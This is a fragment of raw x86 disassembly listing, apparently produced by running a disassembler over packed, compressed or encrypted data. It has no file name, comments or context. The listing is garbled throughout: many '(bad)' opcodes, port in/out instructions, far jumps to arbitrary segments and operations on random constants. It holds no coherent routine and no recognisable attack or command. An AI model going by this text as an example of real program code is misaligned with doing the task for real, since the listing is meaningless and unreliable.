  416e76:	xchg   edi,eax
  416e77:	sbb    eax,0x62d3ba63
  416e7c:	arpl   WORD PTR [ebx],ax
  416e7e:	push   ss
  416e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e80:	inc    ebp
  416e81:	in     al,0xdc
  416e83:	inc    ebx
  416e84:	cdq    
  416e85:	and    DWORD PTR [eax-0x59],0x74
  416e89:	bsr    esp,DWORD PTR [esi-0x5a]
  416e8d:	rcr    esi,cl
  416e8f:	aad    0xa7
  416e91:	(bad)  
  416e92:	push   ss
  416e93:	push   0x18940834
  416e98:	xchg   BYTE PTR [ebx-0x420e4d9c],bh
  416e9e:	aas    
  416e9f:	fsub   st,st(6)
  416ea1:	mov    ch,0x62
  416ea3:	aad    0xe1
  416ea5:	js     0x416eaf
  416ea7:	shr    DWORD PTR [edx-0x760d0614],0x1b
  416eae:	pop    esp
  416eaf:	mov    ecx,0xc75ffc34
  416eb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416eb5:	add    eax,0x272af336
  416eba:	inc    esp
  416ebb:	mov    ds:0x879eaf68,al
  416ec0:	push   esp
  416ec1:	add    al,BYTE PTR [edx+0x7068aa74]
  416ec7:	sbb    dh,BYTE PTR [esi+0x15]
  416eca:	push   ds
  416ecb:	call   0x68f9:0xd547b779
  416ed2:	repz push 0xa170f388
  416ed8:	pop    ebx
  416ed9:	mov    al,ds:0x950b5e1
  416ede:	or     eax,0x3d6a6ad4
  416ee3:	ss sbb ecx,0xffffff83
  416ee7:	pop    esi
  416ee8:	mov    DWORD PTR [edi+0x16],ecx
  416eeb:	aaa    
  416eec:	cmp    al,0xf9
  416eee:	sub    DWORD PTR [edx+0x1b],ecx
  416ef1:	add    BYTE PTR [esi],ch
  416ef3:	or     eax,eax
  416ef5:	out    dx,al
  416ef6:	or     eax,0x35e1456a
  416efb:	push   edi
  416efc:	lea    ebx,[ecx+esi*8-0x1a]
  416f00:	shr    BYTE PTR [edi+0x21],0xdc
  416f04:	mov    edi,ebp
  416f06:	(bad)  
  416f07:	jo     0x416f85
  416f09:	sub    BYTE PTR [edx],bh
  416f0b:	lods   eax,DWORD PTR ds:[esi]
  416f0c:	jmp    0x416f74
  416f0e:	pusha  
  416f0f:	(bad)  
  416f10:	data16 xchg BYTE PTR [edi+0x32],ch
  416f14:	inc    esp
  416f15:	(bad)  
  416f16:	pop    ds
  416f17:	popf   
  416f18:	cdq    
  416f19:	es xchg edi,eax
  416f1b:	push   ebp
  416f1c:	(bad)  
  416f1d:	in     al,0x22
  416f1f:	aam    0xc3
  416f21:	sub    esp,edx
  416f23:	xchg   esi,eax
  416f24:	and    dh,BYTE PTR [edi+0x3b]
  416f27:	imul   esi,DWORD PTR [edx+0x62],0xf3740d67
  416f2e:	cmp    BYTE PTR [ebx-0x77],ch
  416f31:	test   dh,al
  416f33:	nop
  416f34:	das    
  416f35:	add    ah,BYTE PTR [eax]
  416f37:	mov    cl,0xc2
  416f39:	lods   eax,DWORD PTR ds:[esi]
  416f3a:	es enter 0x7b84,0x1e
  416f3f:	or     ecx,DWORD PTR [edx+0x6d98183a]
  416f45:	nop
  416f46:	maxps  xmm1,XMMWORD PTR [edx+esi*2]
  416f4a:	push   ds
  416f4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f4c:	pusha  
  416f4d:	scas   eax,DWORD PTR es:[edi]
  416f4e:	dec    esp
  416f4f:	xlat   BYTE PTR ds:[ebx]
  416f50:	xchg   esp,eax
  416f51:	dec    edx
  416f52:	pop    ds
  416f53:	scas   eax,DWORD PTR es:[edi]
  416f54:	cdq    
  416f55:	clc    
  416f56:	jmp    0x45f84d69
  416f5b:	aam    0x65
  416f5d:	iret   
  416f5e:	push   edi
  416f5f:	aaa    
  416f60:	jmp    0x68fbaa2f
  416f65:	or     eax,0x1fa64559
  416f6a:	lahf   
  416f6b:	xchg   edx,eax
  416f6c:	je     0x416f86
  416f6e:	fwait
  416f6f:	dec    ch
  416f71:	add    eax,0x33701888
  416f76:	jl     0x416f9b
  416f78:	lods   al,BYTE PTR ds:[esi]
  416f79:	push   cs
  416f7a:	and    BYTE PTR [edx],0x87
  416f7d:	retf   
  416f7e:	aad    0x2b
  416f80:	pop    eax
  416f81:	fisub  WORD PTR [eax+0x4aeed003]
  416f87:	aad    0x84
  416f89:	mov    eax,eax
  416f8b:	in     eax,0x8d
  416f8d:	pop    edx
  416f8e:	popa   
  416f8f:	lods   al,BYTE PTR ds:[esi]
  416f90:	les    ebx,FWORD PTR [edi+0x119e3552]
  416f96:	test   esp,edx
  416f98:	(bad)  
  416f99:	jl     0x416f31
  416f9b:	mov    ds:0x54ae036d,eax
  416fa0:	aas    
  416fa1:	cmp    DWORD PTR [eax-0x2b],esi
  416fa4:	outs   dx,DWORD PTR ds:[esi]
  416fa5:	mov    al,ds:0xba3aed5b
  416faa:	add    BYTE PTR [ebx],bl
  416fac:	ror    dh,0x41
  416faf:	aam    0x8a
  416fb1:	addr16 fsub st,st(2)
  416fb4:	ds push ecx
  416fb6:	jns    0x416fff
  416fb8:	mov    ecx,esi
  416fba:	adc    al,BYTE PTR [ecx-0x24]
  416fbd:	call   0x910e5a
  416fc2:	loop   0x416fa3
  416fc4:	adc    BYTE PTR [ecx-0x1],ah
  416fc7:	(bad)  
  416fc8:	cmp    BYTE PTR [edx-0x7b9a3262],ah
  416fce:	data16 stc 
  416fd0:	pop    esp
  416fd1:	dec    ebx
  416fd2:	mov    ah,0xca
  416fd4:	or     al,BYTE PTR [ebx]
  416fd6:	push   ebp
  416fd7:	xchg   ebx,eax
  416fd8:	loop   0x416ffe
  416fda:	jb     0x417049
  416fdc:	and    dh,BYTE PTR [eax-0x62]
  416fdf:	cmp    eax,0x71b9f396
  416fe4:	mov    ebp,eax
  416fe6:	and    esi,DWORD PTR [edi]
  416fe8:	mov    ebx,0xa5521925
  416fed:	add    al,BYTE PTR [eax]
  416fef:	in     eax,dx
  416ff0:	mov    dh,BYTE PTR [ecx]
  416ff2:	fwait
  416ff3:	or     esp,DWORD PTR [eax]
  416ff5:	mov    BYTE PTR [edi],bl
  416ff7:	shl    DWORD PTR [ebx],0x18
  416ffa:	scas   eax,DWORD PTR es:[edi]
  416ffb:	adc    DWORD PTR [esi-0x7203382f],0x0
  417002:	les    eax,FWORD PTR [esi-0x6e]
  417005:	lahf   
  417006:	ficomp DWORD PTR ds:0x8974d33f
  41700c:	mov    DWORD PTR [ebp+0x25e94934],ebx
  417012:	jmp    0x79c1:0x6e252d53
  417019:	push   es
  41701a:	in     eax,dx
  41701b:	(bad)  
  41701d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41701e:	push   ds
  41701f:	sub    DWORD PTR [ecx-0x555ce1a8],ebp
  417025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417027:	xor    al,BYTE PTR [eax-0x61]
  41702a:	and    dl,ah
  41702c:	xchg   edi,eax
  41702d:	pop    es
  41702e:	jge    0x4170a8
  417030:	or     esi,DWORD PTR [edx-0x1a77ff4e]
  417036:	mov    ch,0xe3
  417038:	enter  0x9657,0x86
  41703c:	or     eax,DWORD PTR [ecx]
  41703e:	fadd   DWORD PTR [esi-0x19]
  417041:	leave  
  417042:	sub    dh,bl
  417044:	mov    esp,esp
  417046:	adc    al,0xb6
  417049:	inc    ebp
  41704a:	jl     0x4170b7
  41704c:	mov    ebp,0x41653c64
  417051:	cmp    esi,edi
  417053:	hlt    
  417054:	pusha  
  417055:	enter  0xd71b,0xff
  417059:	fisub  WORD PTR [edx-0x4df1885e]
  41705f:	popa   
  417060:	mov    BYTE PTR [ebx+0x5f],dh
  417063:	inc    eax
  417064:	test   eax,0xc7384d36
  417069:	add    bl,ah
  41706b:	fmul   DWORD PTR [eax-0x2c]
  41706e:	jbe    0x41702d
  417070:	bound  esp,QWORD PTR [edi]
  417072:	pop    ds
  417073:	and    DWORD PTR [edi+0x30],ebx
  417076:	xor    bh,BYTE PTR [esi+ecx*1-0x4f28e4b1]
  41707d:	dec    esp
  41707e:	stos   DWORD PTR es:[edi],eax
  41707f:	test   al,0x3e
  417081:	mov    al,ds:0x15882e2c
  417086:	and    eax,0x4de169d2
  41708b:	retf   0x325
  41708e:	into   
  41708f:	shr    dl,cl
  417091:	xor    edx,esp
  417093:	clc    
  417094:	icebp  
  417095:	sub    ebx,DWORD PTR [edx+0xf]
  417098:	sub    ebx,esi
  41709a:	in     eax,dx
  41709b:	test   al,0x0
  41709d:	jl     0x41703a
  41709f:	adc    al,0x4c
  4170a1:	iret   
  4170a2:	data16 cmp dh,al
  4170a5:	push   ds
  4170a6:	loopne 0x4170d0
  4170a8:	inc    edi
  4170a9:	les    edx,FWORD PTR [ebp-0x80]
  4170ac:	or     DWORD PTR [edi+0x73889f62],ebp
  4170b2:	mov    gs,esp
  4170b4:	stos   BYTE PTR es:[edi],al
  4170b5:	xor    bl,BYTE PTR [edi+ecx*4]
  4170b8:	xor    DWORD PTR [edx],eax
  4170ba:	push   es
  4170bb:	mov    ch,0x94
  4170bd:	cmc    
  4170be:	mov    cl,BYTE PTR [edi]
  4170c0:	xor    ebx,esi
  4170c2:	pop    ds
  4170c3:	(bad)  [ecx]
  4170c5:	xchg   esi,eax
  4170c6:	sbb    BYTE PTR [ebx-0x52177bc8],bl
  4170cc:	dec    eax
  4170cd:	xchg   DWORD PTR [ebx],ebp
  4170cf:	mov    ebp,0x782b05a4
  4170d4:	mov    ds:0xf7b3611f,al
  4170d9:	dec    ebx
  4170da:	and    BYTE PTR [ebx+0x1717e432],ah
  4170e0:	les    esp,FWORD PTR [esi]
  4170e2:	sahf   
  4170e3:	enter  0xefbb,0xe0
  4170e7:	sub    BYTE PTR [esi+esi*8-0x79],ch
  4170eb:	jae    0x41709d
  4170ed:	xchg   ebx,eax
  4170ee:	adc    BYTE PTR [ebp+0x2d5bb089],ch
  4170f4:	mov    eax,0xd2ab4def
  4170f9:	outs   dx,DWORD PTR ds:[esi]
  4170fa:	rcl    BYTE PTR cs:[ebp-0x7d],0x21
  4170ff:	mov    al,0x50
  417101:	mov    DWORD PTR [eax+0x6d],esp
  417104:	mov    ch,0x5a
  417106:	cli    
  417107:	jb     0x417181
  417109:	fld    QWORD PTR [ebp-0x45]
  41710c:	dec    ebx
  41710d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41710e:	xchg   ecx,eax
  41710f:	(bad)  
  417110:	leave  
  417111:	mov    ds,WORD PTR [esi+0x1fba0f67]
  417117:	femms  
  417119:	out    dx,eax
  41711a:	fidivr WORD PTR [edi]
  41711c:	mov    edx,0xc5bca9ce
  417121:	sub    eax,0x33e8b40c
  417126:	fs cmp eax,0x18b0b749
  41712c:	dec    edx
  41712d:	push   ecx
  41712e:	test   DWORD PTR [edx-0x38],ebp
  417131:	scas   eax,DWORD PTR es:[edi]
  417132:	call   0x243ea0f1
  417137:	jmp    0xe08b:0xc897bcc9
  41713e:	aas    
  41713f:	mov    esi,0xa7363d89
  417144:	in     eax,dx
  417145:	iret   
  417146:	jnp    0x41711c
  417148:	cmc    
  417149:	add    eax,0x8d421c0c
  41714e:	add    BYTE PTR [ebx+ecx*1-0x76],bh
  417152:	pusha  
  417153:	out    0x4b,eax
  417155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417156:	pop    ecx
  417157:	aas    
  417158:	mov    eax,0xa1bbb58c
  41715d:	mov    eax,0xe2d5dd0a
  417162:	mov    al,ds:0x996efa2b
  417167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417168:	lea    edi,[ebp-0x5787249f]
  41716e:	adc    edx,DWORD PTR [edi]
  417170:	jb     0x4171a9
  417172:	fst    st(4)
  417174:	mov    gs:0xd2dfb4ec,al
  41717a:	push   ecx
  41717b:	inc    ebx
  41717c:	mov    DWORD PTR [edi-0x6d91d16e],ebp
  417182:	int    0x5a
  417184:	rol    DWORD PTR [edi+ebp*4+0x1b4d8d72],1
  41718b:	icebp  
  41718c:	imul   esi,DWORD PTR [esi],0x5e398b9f
  417192:	bound  ecx,QWORD PTR [edi+0x23]
  417195:	adc    al,0xfe
  417197:	std    
  417198:	jb     0x417176
  41719a:	push   ds
  41719b:	push   edx
  41719c:	inc    ebx
  41719d:	add    edx,edi
  41719f:	call   0xdb7b:0x15ae0212
  4171a6:	inc    eax
  4171a7:	pop    ss
  4171a8:	mov    bh,0x23
  4171aa:	push   ds
  4171ab:	dec    ebx
  4171ac:	or     bh,dl
  4171ae:	int3   
  4171af:	xor    DWORD PTR [eax-0x7c],0x9dfdd574
  4171b6:	rcr    DWORD PTR [esi+0x7ca7e28d],0x8a
  4171bd:	xor    edi,ebp
  4171bf:	rol    BYTE PTR [eax],0x5f
  4171c2:	lahf   
  4171c3:	sbb    al,0x0
  4171c5:	arpl   cx,sp
  4171c7:	aam    0xd5
  4171c9:	pop    eax
  4171ca:	frstor [esi]
  4171cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171cd:	or     BYTE PTR [esi+eax*1-0x1a453c77],bl
  4171d4:	fiadd  DWORD PTR [eax]
  4171d6:	popf   
  4171d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171d8:	inc    eax
  4171d9:	add    ebp,DWORD PTR [edi+ecx*2+0x6c49ed2c]
  4171e0:	repnz sub ebx,DWORD PTR [edi]
  4171e3:	repz mov ebp,es
  4171e6:	cmp    BYTE PTR [ebx+0x76],0x69
  4171ea:	mov    edi,ss
  4171ec:	test   al,0x17
  4171ee:	lods   eax,DWORD PTR ds:[esi]
  4171ef:	mov    esi,0xe72c7a6c
  4171f4:	lea    eax,[edi+ebx*1]
  4171f7:	and    DWORD PTR [ebp-0x4f685dee],0x6e
  4171fe:	lock rcr BYTE PTR [ebx],cl
  417201:	jbe    0x4171de
  417203:	test   eax,0xd2cfd279
  417208:	xchg   DWORD PTR [esi+ebx*1-0x75],ecx
  41720c:	mov    cl,0xd9
  41720e:	ror    DWORD PTR [esi+0xf],1
  417211:	int    0xf2
  417213:	mov    ah,0x26
  417215:	(bad)  
  417216:	cli    
  417217:	aam    0x8
  417219:	(bad)  
  41721b:	push   cs
  41721c:	mov    eax,ds:0x897f8556
  417221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417222:	pop    esi
  417223:	imul   esp,esp,0x4f16efa2
  417229:	add    DWORD PTR [esi+0x4f],ebx
  41722c:	fldenv [ebx-0x63]
  41722f:	scas   al,BYTE PTR es:[edi]
  417230:	and    dl,dh
  417232:	(bad)  
  417233:	jmp    0x1ab6:0xaabbf410
  41723a:	pop    ds
  41723b:	ret    0xdde8
  41723e:	test   ebx,esp
  417240:	jg     0x417266
  417242:	push   0xe0285e3f
  417247:	stos   BYTE PTR es:[edi],al
  417248:	outs   dx,DWORD PTR ds:[esi]
  417249:	sbb    bl,ah
  41724b:	adc    eax,0x4d1e405a
  417250:	shr    cl,cl
  417252:	push   ecx
  417253:	push   0x22
  417255:	not    al
  417257:	sar    bl,cl
  417259:	std    
  41725a:	mov    bl,0xfd
  41725c:	out    0x60,al
  41725e:	push   cs
  41725f:	test   eax,0x593a4895
  417264:	(bad)  
  417265:	int    0xdc
  417267:	xor    eax,DWORD PTR [esi+0x3cc415d6]
  41726d:	inc    ebx
  41726e:	in     al,0xd5
  417270:	retf   0x6d5f
  417273:	gs dec edi
  417275:	sti    
  417276:	outs   dx,DWORD PTR ds:[esi]
  417277:	daa    
  417278:	mov    cl,ah
  41727a:	cmp    dl,BYTE PTR [ecx+ebp*8]
  41727d:	cwde   
  41727e:	call   0x8618:0x2405b18f
  417285:	in     eax,dx
  417286:	add    eax,0x1f203eaf
  41728b:	mov    ebp,ebx
  41728d:	nop
  41728e:	add    DWORD PTR [ebx],ecx
  417290:	xchg   esp,eax
  417291:	and    DWORD PTR [ebp+edx*8+0x7d],esi
  417295:	xchg   esp,eax
  417296:	and    ebp,esi
  417298:	mov    ds:0x8924fecf,eax
  41729d:	imul   ecx,DWORD PTR [eax],0x5092307e
  4172a3:	lock push es
  4172a5:	inc    eax
  4172a7:	aad    0x10
  4172a9:	test   al,0xb0
  4172ab:	pop    esp
  4172ac:	jecxz  0x4172f2
  4172ae:	push   es
  4172af:	push   0xffffff89
  4172b1:	aad    0xdc
  4172b3:	mov    dl,0x8c
  4172b5:	test   BYTE PTR [edx],dh
  4172b7:	jbe    0x417331
  4172b9:	add    dh,BYTE PTR [esi+edx*1]
  4172bc:	xchg   BYTE PTR cs:[edi+edi*8+0xe],dl
  4172c1:	(bad)  
  4172c2:	fwait
  4172c3:	out    dx,eax
  4172c4:	cmp    eax,0xae5e5d03
  4172c9:	pop    edx
  4172ca:	nop
  4172cb:	sub    edi,DWORD PTR [edx+eax*1+0x48]
  4172cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172d0:	mov    ebp,0xc4174a29
  4172d5:	bnd jnp 0x4172bd
  4172d8:	repnz mov edx,0xcd089caa
  4172de:	sub    eax,0x87dd3063
  4172e3:	aad    0xed
  4172e5:	cli    
  4172e6:	mov    edi,esi
  4172e8:	sub    bh,dl
  4172ea:	cmp    eax,0x1e5f6516
  4172ef:	cmp    eax,DWORD PTR [edx-0x19]
  4172f2:	add    ch,BYTE PTR [eax+eax*2]
  4172f5:	xchg   edi,eax
  4172f6:	mov    cl,0xd4
  4172f8:	jp     0x417350
  4172fa:	pusha  
  4172fb:	loope  0x41732f
  4172fd:	icebp  
  4172fe:	into   
  4172ff:	arpl   WORD PTR [eax-0x34ad8913],cx
  417305:	shl    BYTE PTR [esi],0xea
  417308:	add    ebp,DWORD PTR [eax+ecx*4]
  41730b:	not    DWORD PTR [eax+ecx*1]
  41730e:	pusha  
  41730f:	inc    ebp
  417310:	test   eax,0x889eecef
  417315:	xor    edi,DWORD PTR [edi+0x29f8c9e]
  41731b:	cmp    eax,0x68c80379
  417320:	loope  0x417376
  417322:	lds    edx,FWORD PTR [edx-0xe655fd0]
  417328:	pop    edi
  417329:	add    esi,DWORD PTR [eax+eiz*4]
  41732c:	push   ebp
  41732d:	or     al,BYTE PTR [ebp-0x5b]
  417330:	sbb    eax,0x96bc4585
  417335:	pop    es
  417336:	adc    al,0xac
  417338:	sbb    BYTE PTR [ebx],0x85
  41733b:	fwait
  41733c:	call   0x2469:0xdb43d002
  417343:	pop    edx
  417344:	mov    ebx,ebx
  417346:	in     eax,0xb4
  417348:	fdiv   DWORD PTR ds:0x32aebec
  41734e:	pushf  
  41734f:	dec    edx
  417350:	add    DWORD PTR ss:[esi-0x50],ebp
  417354:	jno    0x417369
  417356:	push   ds
  417357:	jns    0x417313
  417359:	sub    DWORD PTR [esi+0x55],edi
  41735c:	scas   eax,DWORD PTR es:[edi]
  41735d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41735e:	sub    eax,0x924c1e42
  417363:	mov    BYTE PTR ss:[ecx+edi*4],cl
  417367:	inc    edx
  417368:	xor    al,0x26
  41736a:	pop    edi
  41736b:	inc    ebp
  41736c:	dec    ebp
  41736d:	inc    DWORD PTR [edx]
  41736f:	add    BYTE PTR [ecx+eiz*2+0x6d],0xb5
  417374:	push   ebp
  417375:	fs sahf 
  417377:	and    ecx,DWORD PTR [ecx+0x6b]
  41737a:	dec    esi
  41737b:	or     al,BYTE PTR [ebx+0xf4f2e3d]
  417381:	cli    
  417382:	pusha  
  417383:	lods   eax,DWORD PTR ds:[esi]
  417384:	std    
  417385:	das    
  417386:	xlat   BYTE PTR ds:[ebx]
  417387:	loopne 0x417313
  417389:	mov    BYTE PTR [esi],al
  41738b:	fild   WORD PTR [esi]
  41738d:	and    eax,0xff9b471f
  417392:	inc    edi
  417393:	mov    esi,0x406d3f81
  417398:	jge    0x41740d
  41739a:	pop    ds
  41739b:	ds dec edi
  41739d:	(bad)  
  41739e:	sti    
  41739f:	enter  0x9c6a,0x7d
  4173a3:	popa   
  4173a4:	loop   0x4173a7
  4173a6:	sbb    edx,DWORD PTR [edi+0x15]
  4173a9:	mov    esp,0x451143d5
  4173ae:	mov    ds:0x158305aa,al
  4173b3:	out    dx,eax
  4173b4:	fwait
  4173b5:	jae    0x417436
  4173b7:	cwde   
  4173b8:	mov    ah,0x1
  4173ba:	jmp    0xef5302d0
  4173bf:	loope  0x417373
  4173c1:	cmc    
  4173c2:	dec    esi
  4173c3:	lods   al,BYTE PTR ds:[esi]
  4173c4:	stc    
  4173c5:	add    dl,BYTE PTR [esi+0x23]
  4173c8:	cld    
  4173c9:	and    al,0x43
  4173cb:	mov    edx,0x471e1bcc
  4173d0:	xor    bl,BYTE PTR [ebp+0x7c88e64]
  4173d6:	leave  
  4173d7:	aad    0x56
  4173d9:	jmp    FWORD PTR [esi+edi*8]
  4173dc:	jmp    0x4173d4
  4173de:	lahf   
  4173df:	add    cl,BYTE PTR [eax-0x48bfad09]
  4173e5:	inc    edx
  4173e6:	fucomp st(3)
  4173e8:	in     al,dx
  4173e9:	add    al,BYTE PTR [esi]
  4173eb:	in     eax,dx
  4173ec:	pop    ecx
  4173ed:	pop    eax
  4173ee:	ret    
  4173ef:	xor    ebx,DWORD PTR [ebx]
  4173f1:	sbb    al,0x32
  4173f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173f4:	mov    BYTE PTR [ebx-0x36575b41],dh
  4173fa:	lods   al,BYTE PTR ds:[esi]
  4173fb:	mov    edx,0x9e6a030a
  417400:	out    dx,eax
  417401:	add    BYTE PTR [esi],dh
  417403:	sub    BYTE PTR [eax-0x30bee07b],bh
  417409:	(bad)  
  41740a:	push   ecx
  41740b:	xchg   BYTE PTR gs:[ecx+ebp*1+0x56989abb],cl
  417413:	jmp    0x715f92f7
  417418:	xor    DWORD PTR [ecx],edx
  41741a:	xchg   edx,eax
  41741b:	test   eax,0x731f0b50
  417420:	test   ebp,ecx
  417422:	retf   
  417423:	iret   
  417424:	out    0xbc,al
  417426:	jmp    0x6fc9b7ff
  41742b:	jg     0x41743f
  41742d:	stos   BYTE PTR es:[edi],al
  41742e:	inc    esp
  41742f:	hlt    
  417430:	mov    DWORD PTR [ebx-0x72abe],edx
  417436:	into   
  417437:	xor    ch,BYTE PTR [esi-0x5777f122]
  41743d:	xor    eax,0xc13d3b4
  417442:	inc    ebx
  417443:	clc    
  417444:	clc    
  417445:	lock push edi
  417447:	push   edi
  417448:	mov    DWORD PTR [ecx+0x48b4780b],eax
  41744e:	jle    0x4173e2
  417450:	stos   DWORD PTR es:[edi],eax
  417451:	add    eax,0x4af8fe3c
  417456:	dec    ebx
  417457:	in     al,dx
  417458:	mov    esi,esi
  41745a:	push   cs
  41745b:	mov    WORD PTR [ebp+0x64e2619e],ax
  417462:	fidiv  WORD PTR [ecx]
  417464:	lea    eax,ds:0x8994daac
  41746a:	pop    esi
  41746b:	mov    al,ds:0xab5a3d22
  417470:	fyl2xp1 
  417472:	lahf   
  417473:	xor    BYTE PTR [esi+0x3f],dl
  417476:	sub    edx,DWORD PTR [ecx+edx*2]
  417479:	add    edi,DWORD PTR [esi+0x13]
  41747c:	lds    edx,FWORD PTR [edi+0x30]
  41747f:	clc    
  417480:	sub    DWORD PTR [ebp+0x1f],esi
  417483:	popf   
  417484:	or     DWORD PTR [eax-0x23],esi
  417487:	ror    DWORD PTR [esi],0xa9
  41748a:	pop    edx
  41748b:	aam    0x7d
  41748d:	xor    ebp,edx
  41748f:	fwait
  417490:	or     esp,edi
  417492:	dec    ebp
  417493:	inc    esp
  417494:	xchg   BYTE PTR [ecx],bl
  417496:	mov    dl,al
  417498:	and    al,0x50
  41749a:	xchg   ebx,eax
  41749b:	xrelease mov DWORD PTR [ebp+0x56],eax
  41749f:	dec    esp
  4174a0:	ins    BYTE PTR es:[edi],dx
  4174a1:	and    dl,bl
  4174a3:	aam    0x5a
  4174a5:	xor    BYTE PTR [edx+0x2b],al
  4174a8:	idiv   BYTE PTR [ebp+0x3b]
  4174ab:	aad    0x11
  4174ad:	xor    cl,0x5c
  4174b0:	test   eax,0xf8cdf403
  4174b5:	inc    ebx
  4174b6:	xchg   edx,eax
  4174b7:	fs call 0x7a154e6c
  4174bd:	dec    edx
  4174be:	jge    0x4174dc
  4174c0:	push   ecx
  4174c1:	pop    ss
  4174c2:	push   cs
  4174c3:	adc    eax,eax
  4174c5:	jg     0x4174e6
  4174c7:	jns    0x41753c
  4174c9:	mov    ebx,0xfabab142
  4174ce:	jmp    0x4174a5
  4174d0:	in     eax,0xf9
  4174d2:	and    BYTE PTR [ebp-0x49],0x7c
  4174d6:	mov    edx,0xdce98743
  4174db:	in     eax,0x6e
  4174dd:	add    al,0xdf
  4174df:	inc    esp
  4174e0:	aas    
  4174e1:	ins    DWORD PTR es:[edi],dx
  4174e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174e3:	outs   dx,BYTE PTR ds:[esi]
  4174e4:	jmp    0x1f3c:0x477d9faa
  4174eb:	jae    0x4174f1
  4174ed:	ins    DWORD PTR es:[edi],dx
  4174ee:	pop    eax
  4174ef:	mov    ah,0xd2
  4174f1:	dec    DWORD PTR ds:0x55575bd7
  4174f7:	out    0xe,eax
  4174f9:	into   
  4174fa:	mov    ebp,0xa9c9880b
  4174ff:	int3   
  417500:	(bad)  
  417501:	stos   DWORD PTR es:[edi],eax
  417502:	jl     0x41754e
  417504:	xchg   edx,eax
  417505:	add    eax,0x5d29793e
  41750a:	add    BYTE PTR [ecx],bl
  41750c:	add    BYTE PTR [edi+0x1892e09],dl
  417512:	inc    esi
  417513:	adc    al,0x6
  417515:	push   esp
  417516:	out    0xdb,al
  417518:	adc    al,0x2
  41751a:	xchg   esi,eax
  41751b:	pop    eax
  41751c:	sti    
  41751d:	or     dl,BYTE PTR [edx+0x60c01819]
  417523:	and    eax,0xfdb19ce9
  417528:	sub    dl,ch
  41752a:	mov    edx,0x34378bd5
  41752f:	sbb    al,BYTE PTR [edx-0x76707943]
  417535:	imul   eax,ebp,0x50a49181
  41753b:	mov    ds:0xbf0c05e6,eax
  417540:	pop    ss
  417541:	loop   0x4174fd
  417543:	mov    ebx,0x71f7e6d
  417548:	enter  0xa1ed,0xad
  41754c:	mov    bl,BYTE PTR [edx+0x21e1d4f4]
  417552:	js     0x417503
  417554:	ja     0x41751c
  417556:	cmp    DWORD PTR [esi],esi
  417558:	mov    DWORD PTR ds:0x482e9ea7,edx
  41755e:	push   esp
  41755f:	outs   dx,DWORD PTR ds:[esi]
  417560:	jl     0x417563
  417562:	add    ch,BYTE PTR [esi]
  417564:	shl    BYTE PTR [eax+0x1],1
  417567:	stc    
  417568:	sub    esp,0x22b74f1f
  41756e:	jmp    0x417595
  417570:	fadd   QWORD PTR [edx]
  417572:	and    BYTE PTR [ebp-0xd],dl
  417575:	in     eax,0x52
  417577:	mov    DWORD PTR [ebx],ebx
  417579:	ds push ds
  41757b:	aad    0xd4
  41757d:	ret    0x6b45
  417580:	test   BYTE PTR [esi-0x7ac02abe],ch
  417586:	jl     0x417532
  417588:	ror    BYTE PTR [ebp-0x12],0xc2
  41758c:	mov    BYTE PTR [edi],bl
  41758e:	aaa    
  41758f:	(bad)  
  417590:	(bad)  
  417591:	sti    
  417592:	loop   0x417515
  417594:	sbb    ebx,DWORD PTR ds:0x891cd426
  41759a:	mov    dl,bl
  41759c:	dec    esp
  41759d:	jnp    0x41757b
  41759f:	aam    0xe2
  4175a1:	cmp    edi,DWORD PTR [edx+0x2325eca9]
  4175a7:	xlat   BYTE PTR ds:[ebx]
  4175a8:	out    0x1f,eax
  4175aa:	jle    0x41754c
  4175ac:	mov    dl,0x60
  4175ae:	pop    edx
  4175af:	mov    al,0x89
  4175b1:	jecxz  0x41757b
  4175b3:	add    eax,0x5ffa2ce8
  4175b8:	fimul  WORD PTR [ebp+0x2]
  4175bb:	adc    DWORD PTR [edi],ecx
  4175bd:	sbb    eax,0x47dd9353
  4175c2:	out    dx,al
  4175c3:	dec    esp
  4175c4:	mov    ah,0x78
  4175c6:	push   ds
  4175c7:	das    
  4175c8:	pop    eax
  4175c9:	daa    
  4175ca:	sbb    esp,DWORD PTR [edi-0x54ae3a4e]
  4175d0:	ret    0xb982
  4175d3:	and    eax,0xd41d67df
  4175d8:	in     eax,0x5d
  4175da:	jg     0x417613
  4175dc:	std    
  4175dd:	mov    DWORD PTR [eax+0x39],esp
  4175e0:	push   ecx
  4175e1:	sub    dl,BYTE PTR [eax+eiz*8-0xa72fe40]
  4175e8:	pusha  
  4175e9:	add    BYTE PTR [ebx+esi*8-0x23],al
  4175ed:	aam    0xbb
  4175ef:	cmp    al,BYTE PTR [edx]
  4175f1:	loope  0x41765c
  4175f3:	in     eax,0x9a
  4175f5:	xchg   edi,eax
  4175f6:	pusha  
  4175f7:	test   DWORD PTR [esp+0x2d54215d],eax
  4175fe:	out    dx,al
  4175ff:	aam    0x10
  417601:	push   ebp
  417602:	add    ebp,ecx
  417604:	rcr    BYTE PTR [ebx+edx*4],1
  417607:	imul   edi,edx,0x79d43c09
  41760d:	cmp    cl,BYTE PTR [ecx-0x70]
  417610:	into   
  417611:	out    dx,eax
  417612:	and    eax,0x280315e7
  417617:	adc    al,0x6
  417619:	idiv   DWORD PTR [ecx]
  41761b:	ret    
  41761c:	adc    eax,DWORD PTR [ebx+0x1e]
  41761f:	xor    eax,0x7f71c26
  417624:	repnz ins BYTE PTR es:[edi],dx
  417626:	xchg   DWORD PTR [ebx-0xd1f9640],ebp
  41762c:	(bad)  
  41762d:	inc    ebp
  41762e:	adc    BYTE PTR [edx+0x1f],0x90
  417632:	pop    ds
  417633:	shl    DWORD PTR [edi+0x567731e1],1
